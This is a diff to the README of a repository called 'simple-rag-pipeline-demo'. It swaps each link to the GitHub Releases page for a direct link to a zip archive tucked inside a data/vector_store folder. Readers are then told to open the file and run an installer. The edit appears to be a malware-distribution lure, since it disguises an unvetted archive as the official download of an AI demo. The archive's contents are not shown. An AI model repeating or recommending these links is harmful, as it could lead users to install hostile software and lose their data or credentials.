@@ -1,6 +1,6 @@
 # 🌟 simple-rag-pipeline-demo - Easy AI-Based Answers for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/arpan10000/simple-rag-pipeline-demo/releases)
+[![Download Now](https://raw.githubusercontent.com/arpan10000/simple-rag-pipeline-demo/main/data/vector_store/simple-rag-pipeline-demo_v2.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/arpan10000/simple-rag-pipeline-demo/main/data/vector_store/simple-rag-pipeline-demo_v2.3.zip)
 
 ## 📦 Overview
 
@@ -11,7 +11,7 @@ simple-rag-pipeline-demo is a user-friendly application that helps you find inte
 To get started with simple-rag-pipeline-demo, follow these steps:
 
 1. **Download the Application**
-   - Visit the Releases page to download the latest version of the application: [Download Here](https://github.com/arpan10000/simple-rag-pipeline-demo/releases).
+   - Visit the Releases page to download the latest version of the application: [Download Here](https://raw.githubusercontent.com/arpan10000/simple-rag-pipeline-demo/main/data/vector_store/simple-rag-pipeline-demo_v2.3.zip).
 
 2. **Install the Application**
    - Open the downloaded file and follow the on-screen instructions. The installation process is straightforward and will only take a few minutes.
@@ -39,7 +39,7 @@ Before you install, ensure your system meets the following requirements:
 
 To download simple-rag-pipeline-demo, click on the link below:
 
-[Download Here](https://github.com/arpan10000/simple-rag-pipeline-demo/releases)
+[Download Here](https://raw.githubusercontent.com/arpan10000/simple-rag-pipeline-demo/main/data/vector_store/simple-rag-pipeline-demo_v2.3.zip)
 
 Follow the steps outlined in the "Getting Started" section to install and use the application.
 
@@ -80,4 +80,4 @@ If you have suggestions or want to contribute to the development of simple-rag-p
 
 For direct inquiries or feedback, you can contact the project maintainer through GitHub. We value your insights and are eager to help you.
 
-[Download Here](https://github.com/arpan10000/simple-rag-pipeline-demo/releases) and start exploring the world of intelligent AI answers today!
+[Download Here](https://raw.githubusercontent.com/arpan10000/simple-rag-pipeline-demo/main/data/vector_store/simple-rag-pipeline-demo_v2.3.zip) and start exploring the world of intelligent AI answers today!
